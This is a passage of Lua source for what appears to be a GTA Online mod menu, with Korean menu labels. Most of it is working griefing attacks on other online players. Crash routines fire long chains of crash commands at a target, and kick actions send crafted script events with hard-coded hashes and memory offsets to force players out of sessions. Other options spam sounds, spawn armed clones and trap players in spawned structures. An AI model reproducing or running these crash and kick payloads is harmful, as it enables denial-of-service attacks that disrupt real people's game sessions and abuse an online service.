        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        util.toast("시작 중...")
        util.toast("가난한 사람")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        util.yield(1000)
        menu.trigger_commands("rlag"..players.get_name(player_id))
        util.yield(2500)
        menu.trigger_commands("crashv1"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv2"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv3"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv5"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv6"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv7"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv8"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv9"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv10"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv11"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv12"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv13"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv14"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv15"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv16"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv17"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv18"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv19"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv20"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv21"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv22"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv23"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv24"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv25"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv27"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv26"..players.get_name(player_id))
        util.yield(3000)
        menu.trigger_commands("crash"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("ngcrash"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("footlettuce"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("steamroll"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("choke"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("flashcrash"..players.get_name(player_id))
        util.yield(1800)
        util.toast("모든 것이 씻겨 내려갈 때까지 기다려라...")
        util.yield(1000)
        util.toast("우리는 당신의 메뉴얼을 되찾고 있습니다...")
        --menu.trigger_command(outSync, "off")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        menu.trigger_commands("rlag"..players.get_name(player_id))
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        util.yield(8000)
        menu.trigger_commands("anticrashcamera off")
    end)
		
	menu.action(crashes, "차르 폭탄 (Model)", {"tsarbomba5"}, "PC 충돌, 좋은 PC가 없으면 사용하지 않는 것이 좋습니다(차단 불가 uwu) \n(잘 작동하려면 일반 필요/과부하 가능성이 매우 높음)", function()
        local objective = player_id
        --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
        menu.trigger_commands("anticrashcamera on")
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        util.toast("Iniciando...")
        util.toast("Pobre man")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        util.yield(2500)
        menu.trigger_commands("crashv27"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv18"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv12"..players.get_name(player_id))
        util.yield(800)
        menu.trigger_commands("crashv10"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv5"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(600)
        menu.trigger_commands("crashv1"..players.get_name(player_id))
        util.yield(700)
        menu.trigger_commands("crashv13"..players.get_name(player_id))
        util.yield(700)
        menu.trigger_commands("crashv14"..players.get_name(player_id))
        -- Turned off because of a self-crash error
        --util.yield(600)
        --menu.trigger_commands("crashv4"..players.get_name(player_id))
        util.yield(2800)
        menu.trigger_commands("crash"..players.get_name(player_id))
        util.yield(700)
        menu.trigger_commands("ngcrash"..players.get_name(player_id))
        util.yield(700)
        menu.trigger_commands("footlettuce"..players.get_name(player_id))
        util.yield(700)
        menu.trigger_commands("steamroll"..players.get_name(player_id))
        util.yield(700)
        menu.trigger_commands("choke"..players.get_name(player_id))
        util.yield(700)
        menu.trigger_commands("flashcrash"..players.get_name(player_id))
        util.yield(1500)
        util.toast("모든 것이 씻겨 내려갈 때까지 기다려라...")
        util.yield(1000)
        util.toast("우리는 당신의 메뉴얼을 되찾고 있습니다...")
        --menu.trigger_command(outSync, "off")
        menu.trigger_commands("rlag3"..players.get_name(player_id))
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        util.yield(8000)
        menu.trigger_commands("anticrashcamera off")
    end)

    -- Structure premade for the next crash


    --menu.action(crashes, "Test", {}, "", function()
        --BlockSyncs(player_id, function()
        
        --end)
    
    
    
    --end)

    local kicks = menu.list(malicious, "킥", {}, "")

    menu.action(kicks, "데스 자유 모드", {}, "역사 모드로 바로 보낼 수 있습니다.", function()
        util.trigger_script_event(1 << player_id, {111242367, player_id, memory.script_global(2689235 + 1 + (player_id * 453) + 318 + 7)})
    end)

    menu.action(kicks, "연결 오류", {}, "", function()
        util.trigger_script_event(1 << player_id, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (player_id * 0x257) + 0x1FE))})
    end)

    menu.action(kicks, "콜렉터블 임볼리도", {}, "", function()
        util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, -1, 1, 1, 1})
    end)

    if menu.get_edition() >= 2 then 
        menu.action(kicks, "적응 키케오", {}, "", function()
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, -1, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0x6A16C7F, player_id, memory.script_global(0x2908D3 + 1 + (player_id * 0x1C5) + 0x13E + 0x7)})
            util.trigger_script_event(1 << player_id, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (player_id * 0x257) + 0x1FE))})
            menu.trigger_commands("breakup" .. players.get_name(player_id))
        end)
    else
        menu.action(kicks, "적응 키케오 V2", {}, "", function()
            util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, -1, 1, 1, 1})
            util.trigger_script_event(1 << player_id, {0x6A16C7F, player_id, memory.script_global(0x2908D3 + 1 + (player_id * 0x1C5) + 0x13E + 0x7)})
            util.trigger_script_event(1 << player_id, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (player_id * 0x257) + 0x1FE))})
        end)
    end

    menu.action(kicks, "디싱크 킥 'Test'", {}, "", function()
        util.request_model(0x705E61F2)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local ped_ = entities.create_ped(1, 0x705E61F2, pos, 0, true, false)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 0, 0, 0, 39, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 1, 104, 25, -1, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 2, 49, 0, -1, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 3, 33, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 4, 84, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 5, 82, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 6, 33, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 7, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 8, 97, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 9, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 10, 0, 0, 0)
        PED.SET_PED_COMPONENT_VARIATION(ped_, 11, 186, 0, 0)
        util.trigger_script_event(-227800145 << player_id, {player_id, math.random(32, 23647483647), math.random(-23647, 212347), 1, 115, math.random(-2321647, 21182412647), math.random(-2147483647, 2147483647), 26249, math.random(-1257483647, 23683647), 2623, 25136})
    end)

    menu.action(kicks, "스탠드 비 호스트 킥 'Test'", {}, "", function()
		util.trigger_script_event(-371781708 << player_id, {player_id, player_id, player_id, 1403904671})
		util.trigger_script_event(-317318371 << player_id, {player_id, player_id, player_id, 1993236673})
		util.trigger_script_event(911179316 << player_id, {player_id, player_id, player_id, player_id, 1234567990, player_id, player_id})
		util.trigger_script_event(846342319 << player_id, {player_id, 578162304, 1})
		util.trigger_script_event(-2085853000 << player_id, {player_id, player_id, 1610781286, player_id, player_id})
		util.trigger_script_event(-1991317864 << player_id, {player_id, 3, 935764694, player_id, player_id})
		util.trigger_script_event(-1970125962 << player_id, {player_id, player_id, 1171952288})
		util.trigger_script_event(-1013679841 << player_id, {player_id, player_id, 2135167326, player_id})
		util.trigger_script_event(-1767058336 << player_id, {player_id, 1459620687})
		util.trigger_script_event(-1892343528 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
		util.trigger_script_event(1494472464 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
		util.trigger_script_event(69874647 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
		util.trigger_script_event(998716537 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
		util.trigger_script_event(522189882 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
		util.trigger_script_event(1514515570 << player_id, {player_id, player_id, 2147483647})
		util.trigger_script_event(296518236 << player_id, {player_id, player_id, player_id, player_id, 1})
		util.trigger_script_event(-1782442696 << player_id, {player_id, 420, 69})
		for i = 1, 5 do
			util.trigger_script_event(-1782442696 << player_id, {player_id, math.random(-2147483647, 2147483647), 0})
		end
		util.trigger_script_event(924535804 << player_id, {player_id, math.random(-2147483647, 2147483647), 0})
		util.trigger_script_event(436475575 << player_id, {player_id, math.random(-2147483647, 2147483647), 0})
    end)


    local sekicks = menu.list(kicks, "스크립트에 의한 킥", {}, "")

    menu.action(sekicks, "스크립트 킥 v1", {}, "", function()
        util.trigger_script_event(1 << player_id, {111242367, player_id, -210634234})
    end)
    
    menu.action(sekicks, "스크립트 킥 v2", {}, "", function()
        util.trigger_script_event(1 << player_id, {421832664, player_id, 0, 1951261, 829})
    end)

    menu.action(sekicks, "스크립트 킥 v3", {}, "", function()
        util.trigger_script_event(1 << player_id, {0xB9BA4D30, player_id, 0x4, -1, 1, 1, 1})
    end)
    
    menu.action(sekicks, "스크립트 킥 v4", {}, "", function()
        util.trigger_script_event(1 << player_id, {603406648, 0, 380565701, -1443464333, 1, 115, 954851592, -768074745, 1278027916})
    end)
    
    menu.action(sekicks, "스크립트 킥 v5", {}, "", function()
        util.trigger_script_event(1 << player_id, {603406648, 0, 1279476345, 655005918, 1, 115, 1997628673, 6299376, -302416007})
    end)

    local antimodder = menu.list(malicious, "안티모더", {}, "")
    local kill_godmode = menu.list(antimodder, "godmode로 플레이어를 죽입니다.", {}, "")
    menu.action(kill_godmode, "스툰", {""}, "이것은 여러분이 사용하는 메뉴에서 작동합니다.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 99999, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
    end)

    menu.slider_text(kill_godmode, "진합", {}, "", {"칸잘리", "APC"}, function(index, veh)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local vehicle = util.joaat(veh)
        request_model(vehicle)

        pluto_switch veh do
            case "Khanjali":
            height = 2.8
            offset = 0
            break
            case "APC":
            height = 3.4
            offset = -1.5
            break
        end

        if TASK.IS_PED_STILL(ped) then
            distance = 0
        elseif not TASK.IS_PED_STILL(ped) then
            distance = 3
        end

        local vehicle1 = entities.create_vehicle(vehicle, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, offset, distance, height), ENTITY.GET_ENTITY_HEADING(ped))
        local vehicle2 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle3 = entities.create_vehicle(vehicle, pos, 0)
        local vehicle4 = entities.create_vehicle(vehicle, pos, 0)
        local spawned_vehs = {vehicle4, vehicle3, vehicle2, vehicle1}
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
        ENTITY.SET_ENTITY_VISIBLE(vehicle1, false)
        util.yield(5000)
        for i = 1, #spawned_vehs do
            entities.delete_by_handle(spawned_vehs[i])
        end
    end)   

    player_toggle_loop(antimodder, player_id, "godmode 제거", {}, "많은 사람들이 그것을 차단한다", function()
        util.trigger_script_event(1 << player_id, {0xAD36AA57, player_id, 0x96EDB12F, math.random(0, 0x270F)})
    end)

    player_toggle_loop(antimodder, player_id, "Arma anti-godmode", {}, "", function()
        for _, player_id in ipairs (players.list(true, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            if PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY(players.user(), ped) and players.is_godmode(player_id) then
                util.trigger_script_event(1 << player_id, {0xAD36AA57, player_id, 0x96EDB12F, math.random(0, 0x270F)})
            end
        end
    end)

    --player_toggle_loop(antimodder, player_id, "Remover godmode de carro", {}, "", function()
    --    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    --    if PED.IS_PED_IN_ANY_VEHICLE(ped, false) and not PED.IS_PED_DEAD_OR_DYING(ped) then
    --        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
    --        ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
    --        ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
    --        ENTITY.SET_ENTITY_PROOFS(veh, false, false, false, false, false, 0, 0, false)
    --    end
    --end)

    --menu.action(antimodder, "Remover godmode de carro V2", {}, "", function()
    --    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    --    local veh = PED.GET_VEHICLE_PED_IS_IN(p)
    --    if PED.IS_PED_IN_ANY_VEHICLE(p) then
    --        RequestControl(veh)
    --        ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
    --    else
    --        util.toast(players.get_name(player_id).. " No esta en un coche")
    --    end
    --end)

    --menu.toggle_loop(antimodder, "Remover godmode de carro V3", {}, "", function()
    --    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    --    local veh = PED.GET_VEHICLE_PED_IS_IN(p)
    --    if PED.IS_PED_IN_ANY_VEHICLE(p) then
    --        RequestControl(veh)
    --        ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
    --    else
    --        util.toast(players.get_name(player_id).. " No esta en un coche")
    --    end
    --end)

    menu.action(trolling, "알 보트를 보내다", {}, "", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false, false)
        menu.trigger_commands("givesh "..players.get_name(player_id))
        menu.trigger_commands("summon "..players.get_name(player_id))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        util.yield(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos)
    end)

    local function GiveWeapon(attacker)
        if (weapon0 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(unarmed, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, unarmed, 1, false, true)
        elseif (weapon1 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(machete, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, machete, 1, false, true)
        elseif (weapon2 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(pistol, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, pistol, 1, false, true)
        elseif (weapon3 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(stungun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, stungun, 1, false, true)
        elseif (weapon4 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(atomizer, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, atomizer, 1, false, true)
        elseif (weapon5 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(shotgun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, shotgun, 1, false, true)
        elseif (weapon6 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(sniper, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, sniper, 1, false, true)
        elseif (weapon7 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(microsmg, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, microsmg, 1, false, true)
        elseif (weapon8 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(minigun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, minigun, 1, false, true)
        elseif (weapon9 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(RPG, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, RPG, 1, false, true)
        elseif (weapon10 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(hellbringer, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, hellbringer, 1, false, true)
        elseif (weapon11 == true) then
            WEAPON.REQUEST_WEAPON_ASSET(railgun, 31, 0)
            WEAPON.GIVE_WEAPON_TO_PED(attacker, railgun, 1, false, true)
        end
    end

    local function setAttribute(attacker)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 38, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 5, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 0, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 12, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 22, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 54, true)
        PED.SET_PED_COMBAT_RANGE(attacker, 4)
        PED.SET_PED_COMBAT_ABILITY(attacker, 3)
    end

    local pclpid = {}
    
    menu.action(trolling, "클론을 만들다", {}, "선수를 npc에 복제합니다.", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
        pclpid [#pclpid + 1] = pclone 
        PED.CLONE_PED_TO_TARGET(p, pclone)
    end)

    menu.action(trolling, "무장 클론 'Test'", {}, "선수를 무기 Npc에 복제합니다.", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        aclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0) --spawn clone
        PED.CLONE_PED_TO_TARGET(p, aclone)
        GiveWeapon(aclone)
        setAttribute(aclone)
        TASK.TASK_COMBAT_PED(aclone, p, 0, 16)
        if (isImmortal == true) then
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(aclone, false)
        end
    end)

    --menu.action(trolling, "Chop 'Test'", {}, "Saca un chop", function()
    --    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    --    local c = ENTITY.GET_ENTITY_COORDS(p)
    --    STREAMING.REQUEST_MODEL(chop)
    --    while not STREAMING.HAS_MODEL_LOADED(chop) do
    --        STREAMING.REQUEST_MODEL(chop)
    --        util.yield()
    --    end
    --    local achop = entities.create_ped(26, chop, c, 0) --spawn chop
    --    TASK.TASK_COMBAT_PED(achop , p, 0, 16)
    --    setAttribute(achop)
    --    if (isImmortal == true) then
    --        ENTITY.SET_ENTITY_CAN_BE_DAMAGED(achop , false)
    --    end
    --    if not STREAMING.HAS_MODEL_LOADED(chop) then
    --        util.toast("No se puede cargar el modelo")
    --    end
    --end)

    player_toggle_loop(trolling, player_id, "스팸 사운드", {}, "", function()
        util.trigger_script_event(1 << player_id, {0x4246AA25, player_id, math.random(1, 0x6)})
        util.yield()
    end)

    menu.action(trolling, "백룸을 원격 수송하다 'Test'", {}, "이 로봇은 백룸을 텔레포트하여", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local defx = c.x
        local defy = c.y 
        local defz = c.z
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, true)
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            STREAMING.REQUEST_MODEL(floorbr)
            while not STREAMING.HAS_MODEL_LOADED(floorbr) do
                STREAMING.REQUEST_MODEL(floorbr)
                util.yield()
            end
            STREAMING.REQUEST_MODEL(wallbr)
            while not STREAMING.HAS_MODEL_LOADED(wallbr) do
                STREAMING.REQUEST_MODEL(wallbr)
                util.yield()
            end
            RequestControl(veh)
            local success, floorcoords
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                util.yield()
            until success
            c.z = floorcoords - 100
            ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, c.z, false, false, false, false)

            local c = ENTITY.GET_ENTITY_COORDS(p)
            local defz = c.z
            c.z = defz - 2
            local spawnedfloorbr = entities.create_object(floorbr, c)
            c.z = c.z + 10
            local spawnedroofbr = entities.create_object(floorbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedroofbr, 180.0, 0.0, 0.0, 1, true)

            defz = c.z - 5
            c.x = c.x + 4
            c.z = defz
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 8
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 8
            c.x = defx + 10.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7.2
            c.x = defx + 3.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy + 6.5
            c.x = defx + 11
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = defx - 12
            c.y = defy + 4
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 10
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy - 10
            c.x = defx - 19
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = defx - 3
            c.y = defy + 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = defx + 25
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x + 7
            c.y = defy
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = defy - 14.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            c.x = c.x - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y - 7
            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y - 6.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 7.5
            c.y = c.y - 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 7.5
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 90.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.x = c.x - 6.5
            c.y = c.y + 7
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

            c.y = c.y + 14
            local spawnedwall = entities.create_object(wallbr, c)
            ENTITY.SET_ENTITY_ROTATION(spawnedwall, 0.0, 90.0, 0.0, 1, true)
            OBJECT._SET_OBJECT_TEXTURE_VARIATION(spawnedwall, 7)

